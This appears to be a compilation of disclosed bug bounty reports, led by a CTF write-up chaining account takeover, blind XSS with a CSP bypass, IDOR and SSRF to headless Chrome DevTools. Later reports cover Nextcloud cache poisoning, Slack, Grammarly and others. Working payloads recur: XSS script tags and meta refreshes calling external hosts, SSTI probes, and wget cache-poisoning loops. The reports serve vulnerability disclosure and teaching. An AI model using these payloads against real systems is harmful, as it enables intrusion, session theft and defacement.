I tested most inputs with the following polyglot I found on Twitter a while ago `App"/><s>'${7*6}[!--+*)(&`. I like it because most of the WAFs don't get triggered by it. Changing my name with this, I saw that `<>{}` are being removed. Basically `App"/><s>'${7*6}[!--+*)(&` got turned into `App"/s'$7*6[!--+*)(&`. Interesting fact.

On the user settings page, there was an `user_id` parameter, hidden. I tried a bunch of things with it, but I couldn't change the profile of other users. Hint: use Burp to unhide these for you, makes things easier.

By getting the password wrong for my account, I discovered we have a Forgot Password option which points to `/recover`. This one can be found by dir busting too.

Every page has a Content-Security-Policy which basically means: we are allowed to use any image; scripts only on this host or prefixed with `https://raw.githack.com/mattboldt/typed.js/master/lib/`; everything else must be on this host.

```
Content-Security-Policy: default-src 'self'; object-src 'none'; script-src 'self' https://raw.githack.com/mattboldt/typed.js/master/lib/; img-src data: *
```

Well, I read about (a bypass for that kind of CSP)[https://blog.0daylabs.com/2016/09/09/bypassing-csp/], a while ago, and I take this as a hint that we will have to bypass this later on.

## 1. Account Takeover via QR Code

{F688289}

I attempted a lot of ways to use the recovery QR code for another account: swapping tokens between two codes, removing the code, using one before the restart, trying SQL injection in the email..

To decode I created the a [CyberChef recipe](https://gchq.github.io/CyberChef/#recipe=Find_/_Replace(%7B'option':'Regex','string':'%5C%5Cx00'%7D,'',true,false,true,false)Find_/_Replace(%7B'option':'Simple%20string','string':'data:image/png;base64,'%7D,'',true,false,true,false)From_Base64('A-Za-z0-9%2B/%3D',true)Parse_QR_Code(false)). This way I could copy them from the browser and decode it fast.

{F688290}

I got lucky a bit. Remember that the app strips `<>{}` on your name? It does that to the username too if we register with "a malicious payload". But apparently not on the email. `nytr0gen@wearehackerone.com{}` is completely valid. Nice!

Side note: To do that either: manually change the input type from `email` to `text`, or use Burp's Match and Replace. Because the browser (and only the browser) validates for allowed email characters.

I tried the QR code from that account and it didn't work. And with a completely different error. It usually was `Something went wrong, please try again.` or `Invalid Code`. That must be interesting, I decoded the QR code and apparently the email inside was `nytr0gen@wearehackerone.com`. OMG! (well the OMG moment hit me after 5 minutes or so).

{F688284}

What if I can register with the email `jobert@mydocz.cosmic{` and use the recovery code for `jobert@mydocz.cosmic` ??? I did that in a hurry and it worked. I was ecstatic. (not that ecstatic the next 24 hours doing this for every restart)

**To mitigate this vulnerability** I would use the sanitize part on the email as early in the validation as possible. Making sure that all functionalities will get the same email address.

## 2. Blind XSS in support chat

Jobert's account is kinda limited (no offense if you're reading this, you rock). I can't upload new documents because "his license expired" and he has no documents. We were lied to from the beginning.

{F688282}

But Jobert's account brings out new functionality. The support chat. And by analyzing the JS code for it, it seems to be vulnerable to XSS, at least on the client side.

```js

$("#chat-form").submit(async function(e) {
    e.preventDefault();
    var t = $("#chat-textarea").val();
    if ("finish" !== t.toLowerCase()
        && "quit" !== t.toLowerCase()
    ) {
        $("#chat-textarea").val("");
        $("#chat-button").attr("disabled", !0);
        $("#chat-div").append(decodeURIComponent('<h3><span class="badge badge-primary">' + t + "</span></h3>"));
        window.scrollTo(0, document.body.scrollHeight);
        if (t.length > 0) {
            var a = await fetch("/support/chat?message=" + t);
            showTypedMessages([(await a.json()).response])
        }
        $("#chat-button").attr("disabled", !1);
        $("#chat-textarea").focus();
    } else showReviewModal()
});
```

Observe the `$("#chat-div").append(decodeURIComponent('<h3><span class="badge badge-primary">' + t + "</span></h3>"));` part and that `t` is user input.

And also there's a hint that this might be a Blind XSS. If we choose to give a feedback of 1 star, we will see the following message `We're sorry about that. Our team will review this conversation shortly.`.

To validate that the other part of the server is vulnerable I chose a payload that doesn't care about the CSP, a `meta refresh tag`: `<meta http-equiv="refresh" content="0;url=https://h4ks.net/go/test2" />` which points to my webserver. And it got a pingback! happy days.

{F688271}

Side note: you won't be able to send this request from the browser because it will redirect you instantly and you won't be able to finish the chat and send it for review. You will have to send the requests from Burp.

Now what do we do about the CSP. [The article I mentioned above](https://blog.0daylabs.com/2016/09/09/bypassing-csp/) comes to the rescue. So we have to bypass `https://raw.githack.com/mattboldt/typed.js/master/lib/`. What does `raw.githack.com` do? Quick read: it gets content from Github and puts the right `Content-Type`. What does this mean? This means I can use a JS file inside one of my Github repos. I choose an older repo from my github to be "stealthy" and play around. You can check failed attempts in [the following commits](https://github.com/nytr0gen/regex-to-dfa/commits?author=nytr0gen&since=2020-01-01&until=2020-01-18).

It worked. Then a long battle started with writing payloads, figuring out what I need from the page, etc.

**To mitigate this vulnerability** I would properly HTML escape the user input on render for admin, user and user Javascript.

## 3. IDOR in Admin Panel to modify users

{F688292}

The page is actually an admin panel that allows to change the name of the user (similar to /settings). It is located at [/support/review/ce643894bb1ce7a4712691db4d18d37550275b861ce90e2c43df0adb09395fd1](https://h1-415.h1ctf.com/support/review/ce643894bb1ce7a4712691db4d18d37550275b861ce90e2c43df0adb09395fd1). I had to exfil the location after every restart.

There is a `user_id` parameter that works with other users. This explains why we have an `user_id` in `/settings`.

I wasn't able to change the name of user 2 (Jobert) and user 1 (what keeps me up at night is who is user 1...).

Remember the sanitization for `<>{}` in settings? Here, the `name` is not sanitized. Anything goes.

The page doesn't check for authorization. That means I was able to access it and play with it from a regular user.

**To mitigate this vulnerability** I would do the following things:

- properly check for authorization only from an admin account
- sanitized the name when modifying
- use HTML escape for the user input from the support chat
- check if the `user_id` is the same as the one for the support chat review

## 4. PDF Generator leaking secrets

Using the admin page, I was able to change the name on my profile to my real name, which is `"'><script src=//nytr0.xss.ht></script>`. Good times!

Before I continue I must confess I had an interesting conversation with the support person. They are very articulate I must say. But when I asked about hints, they wouldn't bulge... I insisted and asked about the flag, and they provided something interesting.

{F688277}

Well, remember the PDF generator from before? An attacker can now use malicious payloads against. Hehe. That means me, I'm the attacker, I'm after your secret documents.

{F688285}

I had a lot of failed tries on this one:

- I can redirect to my page and have a PDF done of that
- tried a bunch of SSTI payloads `{{4*4}} [[5*5]] {7*7} ${9*9}`
- tested for `/settings` to see if I can find the infamous user 1
- hopeless for some hours, tried a bunch of different things, even gone back to the other vulnerabilities to try to escalate them somehow
- maybe tried the same things more than once
- I tried to load `http://mydocz.cosmic/` for at least 10 times
- all the while re-registering every hour. That part was loads of fun.
- tried to access AWS metadata url. It should have worked with an iframe but it failed to generate a PDF file. Anyway I tried a hail-merry and used the DNS Rebinding tool from Daeken.

Then I read some more about Chrome Headless and how it should work (30 new RAM-eating tabs). One article suggested that it comes with [DevTools](https://developers.google.com/web/updates/2017/04/headless-chrome#frontend) open at port `9222`. That's a stretch but let's try it.

And it freaking WORKED!

{F688296}

What now? Understand the websocket protocol I guess.. I opened the Chrome Headless DevTools locally (`google-chrome-stable --headless --disable-gpu --remote-debugging-port=9222 https://www.chromestatus.com`) and saw a `/json/list` endpoint. Let's check `http://localhost:9222/json/list` on our PDF converter.

{F688272}

Can you see it? To my shame, I didn't see it the first time and I generated another pdf to see if the ids differ, because I was 100% ready to work out the websocket protocol for devtools. There it was, the secret document !!! I screamed with joy enough that I woke up my girlfriend. That part ended well too.

{F688273}

**To mitigate this vulnerability** I would do the following:
- disable javascript in the PDF converter
- properly HTML escape the user input - meaning the name of the user

It was a great challenge. I had a lot of fun solving it and putting the pieces together. I want to thank everyone in this great community for being so friendly to beginners.

## Impact

It's pretty bad.

#bountyplz
#bountyplz
#bountyplz

---

### [https://help.nextcloud.com::: Web cache poisoning attack](https://hackerone.com/reports/429747)

- **Report ID:** `429747`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Nextcloud
- **Reporter:** @g4mm4
- **Bounty:** - usd
- **Disclosed:** 2020-01-31T19:08:52.345Z
- **CVE(s):** -

**Vulnerability Information:**

Hi there,
I just found the website:
https://help.nextcloud.com
is infected with "Web cache poisoning"
Abuse this bug, Attacker can:
1. Poison your cache with HTTP header with XSS included. This attack may leads to Stored XSS
2. Poison your website contains malware url (cache poisoned by attacker), maybe the user's browser (like Firefox, Chrome) will block your website (https://help.nextcloud.com)

How to reproduce the issue:

    In the 1st terminal, run command likes this: 
$ while true; do wget "https://help.nextcloud.com/?qwKzzSR=649227948379" --header 'X-Forwarded-Host: cyberjutsu.io/#' -qO->/dev/null; echo "poisoning...";done
    In the 2nd terminal, run command below for confirmation this attack is successful: 
while true; do wget "https://help.nextcloud.com/?qwKzzSR=649227948379" -qO-|grep "cyberjutsu.io"; echo "ping my payload..." ;done

Finally, this link bellow: https://help.nextcloud.com/?qwKzzSR=649227948379 was infected with "Web Cache poisoning attack".
Please see the attached image for details.

Impact
Stored XSS attack, deface website ....
Cheers,
~g4mm4

## Impact

Stored XSS attack, deface website, phishing for funs :)

---

### [[klona] Prototype pollution](https://hackerone.com/reports/778414)

- **Report ID:** `778414`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** Node.js third-party modules
- **Reporter:** @skyn3t
- **Bounty:** - usd
- **Disclosed:** 2020-01-23T11:17:26.602Z
- **CVE(s):** CVE-2020-8125

**Vulnerability Information:**

I would like to report Prototype pollution in klona
It allows adding arbitrary property to Prototype while deep cloning an object

# Module

**module name:** klona
**version:** <1.1.1
**npm page:** `https://www.npmjs.com/package/klona`

## Module Description

A tiny (366B) and fast utility to "deep clone" Objects, Arrays, Dates, RegExps, and more!

## Module Stats

356 weekly downloads

# Vulnerability

## Vulnerability Description

See: https://snyk.io/vuln/SNYK-JS-LODASH-450202

## Steps To Reproduce:

Described here: https://github.com/lukeed/klona/pull/11/files

Note:
This vulnerability was reported directly to owner here https://github.com/lukeed/klona/pull/11 on 10/01/2020.
Fix published in v1.1.1 on 15/01/2020

# Wrap up

- I contacted the maintainer to let them know: Y
- I opened an issue in the related repository: Y

> Hunter's comments and funny memes goes here

{F690469}

## Impact

Denial of Service and possible Remote code execution by overriding object's property methods like `toString`

---

### [Bypass email verification and create email template with the editor](https://hackerone.com/reports/737169)

- **Report ID:** `737169`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Stripo Inc
- **Reporter:** @aishkendle
- **Bounty:** - usd
- **Disclosed:** 2019-12-19T13:01:15.930Z
- **CVE(s):** -

**Summary (team):**

The vulnerability has been fixed

---

### [Хранимая XSS в личных сообщениях новое место](https://hackerone.com/reports/310339)

- **Report ID:** `310339`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** ok.ru
- **Reporter:** @circuit
- **Bounty:** - usd
- **Disclosed:** 2019-12-02T11:38:34.318Z
- **CVE(s):** -

**Summary (team):**

Stored XSS in chat title at https://ok.ru/messages

---

### [4 severe remote + several minor OpenVPN vulnerabilities](https://hackerone.com/reports/242579)

- **Report ID:** `242579`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Internet Bug Bounty
- **Reporter:** @guido
- **Bounty:** - usd
- **Disclosed:** 2019-10-14T00:24:28.052Z
- **CVE(s):** CVE-2017-7521, CVE-2017-7520, CVE-2017-7508, CVE-2017-7522

**Vulnerability Information:**

CVE-2017-7521 Remote server crashes/double-free/memory leaks in certificate processing
CVE-2017-7520 Remote (including MITM) client crash, data leak
CVE-2017-7508 Remote server crash (forced assertion failure)
CVE-2017-7522 Crash mbed TLS/PolarSSL-based server
(no cve) Remote/mitm Null-pointer dereference in establish_http_proxy_passthru()
(no cve) Stack buffer overflow if long –tls-cipher is given
(no cve) Remote (including MITM) client stack buffer corruption

https://community.openvpn.net/openvpn/wiki/VulnerabilitiesFixedInOpenVPN243
https://guidovranken.wordpress.com/2017/06/21/the-openvpn-post-audit-bug-bonanza/

---

### [Administrator access to staging.railto.com](https://hackerone.com/reports/686015)

- **Report ID:** `686015`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Railto LLC
- **Reporter:** @dhakal_bibek
- **Bounty:** - usd
- **Disclosed:** 2019-10-03T00:36:05.480Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Hey team,

While doing some recon for railto sub-domains. i came across a most critical bug which lets me complete access of https://staging.railto.com. i can add anything and removing anythings as i got the ADMIN level privilege. 

##Steps
  1. Go to https://staging.railto.com/admin  url.
  2. Set username as admin and password as password to login the admin page. Since password is too easy to guess, i was like what... after finding this bug.
  3. If unauthorized people has got this bug then he could use it in a bad way.
I didn't want to move forward because i am not an admin of this page and i dont want you guys in trouble.  If it is not enough then i will provide a detail poc

## Impact

Admin of the page is simple enough.

---

### [User-assisted RCE in Slack for macOS (from official site) due to improper quarantine meta-attribute handling for downloaded files](https://hackerone.com/reports/470637)

- **Report ID:** `470637`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Slack
- **Reporter:** @metnew
- **Bounty:** - usd
- **Disclosed:** 2019-09-14T22:28:54.831Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary

### **GateKeeper/Quarantine bypass for downloaded files**

Lack of `com.apple.quarantine` meta-attribute for downloaded files allows a remote attacker to send an executable file that won't be checked by Gatekeeper .

### File opening **doesn't trigger native alerts** from GateKeeper/Quarantine

> Downloaded executable files lack `com.apple.quarantine` meta-attribute => no alerts about launching an executable from the web will appear.

### Code execution after opening

Opening a downloaded `.terminal` file in Slack via "Shift + Click"  (or in Finder) immediately leads to running attacker's code on a target device.

### `.terminal` file

1. Opening leads to command execution.
2. Looks safe - XML file.
3. Downloaded `.terminal` file **couldn't be opened** if application sets quarantine meta-attribute properly. However, Slack (Direct Download) doesn't do that.

## Attack scenario

1. Attacker sends `exploit.terminal` to the victim. File looks like a plaintext file in preview.
2. Victim opens `exploit.terminal` file via "Shift + Click" (or via Finder)
3. No alert from Gatekeeper about unsigned executable
4. No alert about running executable file downloaded from the web
5. Shell commands from `exploit.terminal` get executed with user-level privileges.

## Version

Decribed scenario is reproducible in Slack 3.3.3 Direct Download.
Slack from AppStore has correct quarantine rules and isn't vulnerable.

## Additional details

`exploit.terminal` attached + Screencast attached.

### Quarantine
macOS is build in such way that OS will ask user before opening any downloaded and potentially launchable (in default setup) files. This rule applies to `.terminal` files too.

### TL;DR: 
- no quarantine -> `exploit.terminal` is launchable in 1 click without warning a user with popups
- quarantine -> no immediate launch for all files (2 popups) +  no RCE is possible if GateKeeper level set to "AppStore only"

## Impact

## Impact

Attacker could send a crafted `.terminal` file to the victim, which will be executed immediately after opening this file via "Open" button or in Finder. 

The attack scenario requires a certain level of user interaction. 
But the file looks safe and the victim doesn't expect that it'll be launched immediately

### Additional Impact

GateKeeper bypass allows running arbitrary apps in environments hardened with Gatekeeper settings set to "AppStore only".

---

### [User Editable nextcloud Wiki pages of Public Repositories](https://hackerone.com/reports/498878)

- **Report ID:** `498878`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Nextcloud
- **Reporter:** @chernobyl
- **Bounty:** - usd
- **Disclosed:** 2019-08-31T12:32:06.581Z
- **CVE(s):** -

**Vulnerability Information:**

###Summary :
I have found that the "Edit" Permissions of WIKI pages are NOT disabled on the public repositories of nextcloud. Generally Edit permissions are given only to the collaborators of a specific repository. but that is not the case with Nextcloud, It is public editable which isn't right in terms of security. 

An attacker can create a new Wiki page for this particular nextcloud Github Wiki page : There is no restriction on it.


https://github.com/nextcloud/logreader/wiki

An attacker could include any content/links and direct users to other similar nextcloud pages to steal user information. 
Attacker could even provide false information about the user to provide their private keys or passwords using a form/page.

## Impact

These wikis should not be publicly editable due to the possibility of abuse through hacktivities such as Phishing, Defacement, etc

Many companies (even on hackerone) are correcting this issue and removing the "Edit" Permissions to the wiki page of public repositories.

---

### [Handling of `tracking` command allows making arbitrary blind requests with user's cookies from Grammarly Extension's origin](https://hackerone.com/reports/389108)

- **Report ID:** `389108`
- **Severity:** Critical
- **Weakness:** Uncategorized
- **Program:** Superhuman (formerly Grammarly)
- **Reporter:** @metnew
- **Bounty:** - usd
- **Disclosed:** 2019-08-01T15:59:18.760Z
- **CVE(s):** -

**Vulnerability Information:**

## **Summary:**

Attacker could trigger Grammarly extension's `gnar._fetch` command using a crafted page to perform XHR with cookies and any configurational params to any cross-origin resource.

## **Description:** 

### Page could Init Grammarly popup editor [no user gesture, helper]

Events have `isTrusted` property, which allows to determinate, whether current event is trusted(initiated by user). Grammarly popup editor could be initiated by page.

As I understood: injected content script could successfully emit events to background page only if popup was initiated earlier. 
That means, attacker needs to initiate the popup somehow to communicate with background page through injected content script.

Not sure about the root cause of this behavior. Probably, because popup is created by background page origin, that's why background page becomes accessible after this.

## Sending commands to Grammarly content script

Active page could send commands to injected Grammarly content script using `window.postMessage`.

Command structure:
``` js
window.postMessage({
    grammarly: true,
    action: 'tracking',
    method: 'gnar._fetch',
    props: {}
    params: {}
}, "*")
```

## Commands handling in injected content script

Grammarly content script "parses" commands using this snippet:

``` js
function Z(e) {
    var t, n = e.action;
    ... 
    "tracking" === n && e.method && g.call(e.method, e.param, e.props)
    ...
}
```

`tracking` commands are later passed to this snippet:
``` js
f.emitBackground("tracking-call", {
    msg: e, // command's "method" field
    data: t // command's "props" + "params" fields
 }, s)
```

This `f.emitBackground` sends event to background page.

### Commands handling in extension's background page

The extension uses next snippet to handle `tracking` commands from content script:

``` js
function w(e, t) { // t = params + props
    var n, a = o(e.split("."), 2), // a = command's "method" field splitted by dot into array
        c = a[0],
        s = a[1];
    if ("gnar" === c) 
        if (p.tracker.gnar)
            if ("track" === s) {
                var u = o(t, 2),
                    l = u[0], // 
                    f = u[1];
                p.tracker.gnar.track(r({
                    eventName: g.gnarAppName + "/" + l // something not discovered yet 
                }, f))
            } else
                p.tracker.gnar[s] ? (n = p.tracker.gnar)[s].apply(n, i(t)) : b.error(
                    "gnar client does not have method '" + s + "' for '" +
                    e + "' in runMessage");
    else b.error("gnar client not available for '" + e + "' in runMessage");
    else b.error("unrecognized'" + e + "' in runMessage ")
}
```

#### `p.tracker.gnar`

That's an object with next structure:
```js
{
    _batchId: 8,
    _client: "chromeExt",
    _clientVersion: "14.858.1756",
    _containerIdManager: t {primaryStorage: t, secondaryStorages: Array(3), _logger: t, _metric: e,  _cacheSuccessTimeoutMillis: 1000, …},
    _eventsUrl: "https://gnar.grammarly.com/events",
    _fetch: ƒ (),
    _instanceId: "nxIwqgPE",
    _isTest: false,
    _isUserReady: true,
    _liteUrl: "https://gnar.grammarly.com/lite",
    _logger: t {name: "gnar", level: 2, context: e, appender: ƒ},
    _metric: t {name: "gnar", timersSink: ƒ, countersSink: ƒ, _fetch: ƒ, _sendTimeout: 7500, …},
    _queue: [],
    _storePingTimestamp: true,
    _userId: "701014151
}
```

Additionally, it has a set of methods.

> I guess `p.tracker.gnar` controls reporting telemetry events to Grammarly.

#### Attacker-controllable function call

``` js
p.tracker.gnar[s] ? (n = p.tracker.gnar)[s].apply(n, i(t))
```

`s` = that's the second part of command's "method" field. E.g. `"method": "hello.grammarly"` -> s = 'grammarly'
`t` = `params` and `props`

This snippet could be rewritten as:

``` js
GNAR[methodsMethod].apply(GNAR,  toArray(paramsAndProps))
```

#### `p.tracker.gnar`s `.constructor` and methods

`p.tracker.gnar` object could be overwritten using `.constructor`  and `.setUser` methods those allow changing some `p.tracker.gnar` properties. 

`p.tracker.gnar`s `.constructor`
```
function e(e, t, n, r, o, i, c, s) { // Attacker controls e and t params + non-listed params using `setUser`
            void 0 === s && (s = !1),
            this._client = t,
            this._clientVersion = n,
            this._fetch = r,
            this._containerIdManager = o,
            this._logger = i,
            this._metric = c,
            this._storePingTimestamp = s,
            this._instanceId = a.alphanumeric(8),
            this._batchId = 0,
            this._isUserReady = !1,
            this._queue = [],
            this._eventsUrl = e + "/events",
            this._liteUrl = e + "/lite",
            this._pingMaybe()
        }
```

##### `gnar.setUser`/`gnar._execQueue` / `gnar._send` / `gnar._doSend` / `gnar._enqueue` 

`p.tracker.gnar` has a set of interesting methods like `setUser`. Grammarly extension uses `setUser` to invalidate session. 

``` js
a["session-invalidate"] = function (e, t, n, r, o) {
        ...
        s.call("gnar.setUser", i, c)
        ...
}
```

> I'm not sure, but looks like calling this method with crafted payload may lead to incorrect userId in telemetry. 

Team probably should know how much powerful listed above funcstions are. 

#### `_fetch`

`p.tracker.gnar` has `_fetch` property which points to `fetch` function.
More interesting is that, it's a polyfill, not a native function.

> I guess this polyfill isn't compliable to WHATWG fetch, because it allows making requests to `data:/chrome-extension:/` origins.

That means, it's possible to call `fetch()` with attacker's params from the extension.

```
p.tracker.gnar_fetch.apply(p.tracker.gnar, ["FetchURL", "FetchParams"])
```

Page has to call `window.postMessage` with next object to call `fetch` from the extension
```
x = window.top.postMessage({
    grammarly: true,
    action: 'tracking',
    method: 'gnar._fetch',
    props: { // FetchParams
        method: 'GET',
        headers: {
            'Content-Type': 'application/json'
        }
    },
    param: 'https://mail.google.com/mail/u/0/#inbox' // <FetchURL>
}, "*")
```

#### XHR + cookies

Grammarly extension has permissions to access all URLs and cookies from all origins. 
Grammarly makes all XHR requests with cookies -> it's possible for attacker to make blind requests with cookies to any origin.

> (except `chrome://`, however, `chrome-extension://` is allowed because of polyfill for `fetch`).

> More details in "Impact" section.

## Browsers Verified In:

Chrome 70.0.3508.0 Canary
Chrome 68.0.3440.75 Stable
Grammarly: 14.858.1756

## Steps To Reproduce:

### Change user's name in Grammarly
1. Open `app-grammarly-csfr.html`
2. Page makes request to `https://auth.grammarly.com/v3/user` to change your name to "Anonymous User" 

### GET Gmail as proof
1. Open Grammarly extension debug page in Chrome
2. Open `get-request-to-gmail.html`
3. Open "Network" tab in the debug page
4. Note that extension made a GET request to Gmail (with cookies)
5. Open request preview
6. Note that request includes your gmail content
7.  That means, it's possible to initiate requests with cookies to any origin. Web applications without "direct CSRF protection" (e.g. `hidden` field with some value, not token in cookies ) are controllable by attacker.

## Supporting Material/References:

1. Screencast for POST to`https://auth.grammarly.com/v3/user`. [1st PoC]
2. Screencast to prove that Grammarly makes requests with cookies to cross-origin domains. [2nd PoC] 

> I didn't know a good CSRF target, so I've recorded a second screencast with Gmail and GET request. I think that's enough to prove the vulnerability.

## Impact

## Universal CSRF
> Actually, "Universal CSRF" isn't a correct definition 😉. But I think it correctly expresses impact of the vulnerability.

Attacker could trigger Grammarly extension's `gnar._fetch` command  using crafted page to perform XHR with any configurational params to any origin [without user gesture]. 

Web applications without good protection against CSRF (`hidden` field in form, not cookies/origin check/etc.) are vulnerable to CSRF. 

Page could made **any number of blind requests through Grammarly extension with cookies**. 

## Overwrite `p.tracker.gnar` and call any method of this object

`p.tracker.gnar` has a set of interesting methods like `setUser`. Grammarly extension uses `setUser` to invalidate session.

> I assume, calling this methods leads to sending invalid telemetry data to Grammarly.

## Possible UXSS via data manipulation

Attacker could overwrite `p.tracker.gnar` with arbitrary data. However, `postMessage` doesn't allow to send [non-clonable objects](https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Structured_clone_algorithm).

Attacker could call something like:

```
AnythingClonable.apply(Object, [AnythingClonable])
```

> I didn't test this with `File/Blob/FileList` non-clonnable objects. However, I think it's not possible to turn the snippet above into XSS.
 
> P.S: Grammarly, sorry for typos/mistakes if any. Your extension has some bugs at `hackerone.com` domain.

---

### [`socket` command allows sending data over WebSockets to arbitrary origins from Grammarly Extension](https://hackerone.com/reports/395729)

- **Report ID:** `395729`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Superhuman (formerly Grammarly)
- **Reporter:** @metnew
- **Bounty:** - usd
- **Disclosed:** 2019-07-15T16:34:14.775Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary

1. Attacker could trigger Grammarly extension's `socket` command using a crafted page to perform WS connection(and data sending) from extension's background page (with cookies and origin) to any URL.
2. Additionally, commands received from the attacker's server are handled by extension and could be used to trigger wrong business-logic behavior (misleading commands) or possibly(!) RCE.

## Description

> Disclaimer: the report is long enough.

### "socket" command vs content script

Next snippet handles "socket" commands received from `window.addEventListener('message')`. 
TL;DR: it sends received "socket" command to the background page.

``` js
function Z(e) {
           var t, n = e.action;
           ...
            "socket" === n && p.emitBackground(b.MessageTypes.client, e),
           ...
        }
```

### "socket" command vs background page

TL;DR: sent "socket" command handled using next snippet, when background page receives it:

``` js
this._onContentScriptSocketMessage = function(e, t, n) { // <-- e = action received from content script
                if (e && !m._getConnectionState().authToCapiDegradation) {
                    var r = e.socketId
                      , o = e.method
                      , i = "close" === o
                      , a = m._sockets[r];
                    if (a || !i) {
                        switch (a || (a = new d.BackgroundSocket(e,n,m._onBackgroundSocketEmit,m._fakeCapi),
                        m._sockets[r] = a), // <-- creates new high-level socket object
                        e.arg && "start" === e.arg.action && m._dialect && (e.arg.dialect = m._dialect),
                        o) {
                        case "connect": // <-- connect method
                            m._refreshUser(!0, "onSessionStart").then(function() {
                                return a.connect(e.arg)
                            });
                            break;
                        case "send":
                            a.send(e.arg); // <-- "send" with an attacker-controllable property as argument
                            break;
                        case "reconnect": <-- Other methods (wsPlay/wsPause/etc.) are under attacker's control too
                            a.reconnect();
                            break;
                        case "release":
                            a.release();
                            break;
                        case "close":
                            a.close();
                            break;
                        case "wsPlay":
                            a.wsPlay();
                            break;
                        case "wsPause":
                            a.wsPause();
                            break;
                        default:
                            p.error("Unknown method", o)
                        }
                        i && (a.close(),
                        a.overrideEmitToNoOp(),
                        delete m._sockets[r])
                    }
                }
            }
```

The final proof that it's possible to connect to any origin  - `connect` method:
``` js
 function E(n) { // <-- e = event received from content script
                w.isConnected() || (A("connect to url: " + e.url),
                t = new u(e.url), // <-- e.url is under attacker's control
                p = !1,
                d = !1,
                t.onopen = function() {
                    g = v,
                    d = !0,
                    h && (h = !1,
                    w.close()),
                    n && e.resetQueueOnReconnect ? b = [] : O(),
                    w.emit("connect"),
                    n && (w.emit("reconnect"),
                    c = !1)
                }
                ,
                t.onmessage = function(t) {
                    s && console.log("%c Received: %s", "color: #46af91;", t.data), // <--- Screencast!
                    S(t.data),
                    function(t) {
                        try {
                            t = JSON.parse(t)
                        } catch (e) {
                            C(e.stack || e, t)
                        }
                        e.useQueue ? (y.push(t),
                        T()) : w.emit("message", t) // <-- t = command could be received from attacker's server
                    }(t.data)
                }
                ,
               ...
}
```

### Websockets 101 (important for understanding)

> Websockets differs from XHRs - As opposite to XHR, CORS doesn't apply to WS.

1. Page could initiate WS connection to any cross-origin resource.
2. There is no browser-level mechanism to prevent WS connection from one origin to another. (like CORS for XHR)
3. Connection through `wss://` includes all user's cookies.

WS server is responsible for validating `Origin` header to check is connection trusted.

#### Example

1. `evil.com` sends XHR to `good.com` = CORS rejects requests (assuming no `Access-Control-Allow-Origin` was specified in response)
2. `evil.com`  connects to `ws://good.com` using WS = server at `good.com` is responsible for `Origin` header validation.

### Attack mechanism

[Page] -> (socket action) -> [Content script] -> (socket action) -> [Background page] -> [WS server]

### Summary [1/3]

Page could exploit "socket" command to :

1. connect to arbitrary WS endpoint from Grammarly extension origin
2. send arbitrary data from Grammarly extension origin to any WS endpoints

### `w.emit("message", t)` [received command vs background page]

You probably noticed this line in `t.onmessage` handler.
Shortly, background page handles events received from remote WS server.
Grammarly uses `wss://capi.grammarly.com/freews` endpoint for text processing.

> I guess "capi" is an abbreviature for Command API.

As of extension could connect to any WS endpoint, it will handle commands received from attacker's endpoint too.

I don't show the full call stack, however, `w.emit("message", commandFromServer)` is handled in this snippet:
``` js
this._onBackgroundSocketEmit = function(e, t, n) { // <-- e = command from attacker's server
                var o = e.event
                  , i = e.socketId
                  , a = e.msg;
                if (p.trace("from ws " + o + " " + i, {
                    msg: a,
                    messageType: t
                }),
                a && a.error && "not_authorized" === a.error)
                    return m._tryToFixSession();
                var c = setTimeout(function() {
                    var e = m._sockets[i];
                    e && (e.release(),
                    e.overrideEmitToNoOp(),
                    delete m._sockets[i])
                }, m._releaseTimeout);
                m._message.emitTo(n, t, r({}, e, { // <-- send command from server to content script
                    id: s.guid()
                }), function(e) {
                    return e && clearTimeout(c)
                })
            }
```

Shortly, `emitTo` emits the command (from attacker's server) from background page to content script.

### Summary [2/3]

Background page:
1. Connects to attacker's WS endpoint 
2. Receives a command from the WS endpoint
3. Handles received command
4. Sends received command to the content script

### \#394518

First of all, #394518 is about user data.
It's possible to get the latest available `socketId` property and send random malformed data to `capi.grammarly.com` under current `socketId`. However, I think it has zero impact :(

### received command vs content script

Received commands handled in next function:
``` js
this._onMessage = function(e, t) {
                var r = n._sockets[e.socketId]; // <-- e.socketId from previous "connect" command
                if (r) {
                    var i = e.msg || {}; // <-- e.msg - msg received from attacker's server 
                    i.action && "error" === i.action.toLowerCase() && n._telemetry.soketCsErrorMsg(i),
                    t("ok"),
                    r.emit(e.event, e.msg) <--- emit "message" event in content script with attacker-supplied command
                }
            }
```

#### `r.emit(e.event, e.msg)`

I was able to call `r.emit(e.event, e.msg)` from the snippet above a few times [No PoC, however, It was documented during research]. 
However, after analyzing listeners of this `emit` (and ancestor calls) I realized the API is too high-level and It can't lead to script execution in the content script.

List of available actions to trigger from server:
```
add: [ƒ]
alert: (2) [ƒ, ƒ]
capiError: [ƒ]
disconnect: (2) [ƒ, ƒ]
finish: (2) [ƒ, ƒ]
finished: [ƒ]
frequent_not_authorized_error: [ƒ]
frequent_runtime_error: [ƒ]
plagiarismChecked: [ƒ]
remove: [ƒ]
sending: [ƒ]
serviceState: [ƒ]
socketConnect: [ƒ]
socketError: [ƒ]
socketFailCount: [ƒ]
socketReconnect: (2) [ƒ, ƒ]
socketReconnectAfterError: [ƒ]
socketStart: (2) [ƒ, ƒ]
start: (2) [ƒ, ƒ]
stats:timing: [ƒ]
submit_ot: [ƒ]
synonyms: [ƒ]
too_many_runtime_error: [ƒ]
```
I didn't test this function call too much.

## Browsers Verified In:

1. Chrome 68.0.3440.106 stable
2. Chrome 70.0.3521.0 canary
3. Grammarly 14.861.1790

## Steps To Reproduce:

#### `localhost:8080`

1. Open `exploit.html`
2. Start server (`npm i ws && node server.js`)
3. Click "Connect to localhost"
4. Check server process logs - "Connection received" logged
3. Click "Send "{"grammarly": "1"}" to localhost" and then "Connect to localhost"
4. Check server process logs - "Message event {"grammarly":"1"}" logged

